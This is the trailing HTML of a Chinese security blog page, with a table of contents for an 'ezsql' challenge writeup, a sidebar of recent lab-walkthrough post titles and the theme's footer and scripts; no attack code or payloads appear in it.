fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezsql"><span class="toc-number">1.</span> <span class="toc-text">ezsql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">出题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">出题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4WP"><span class="toc-number">1.3.</span> <span class="toc-text">完整WP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-01-23T09:22:35.758Z" title="发表于 2024-01-23 17:22:35">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
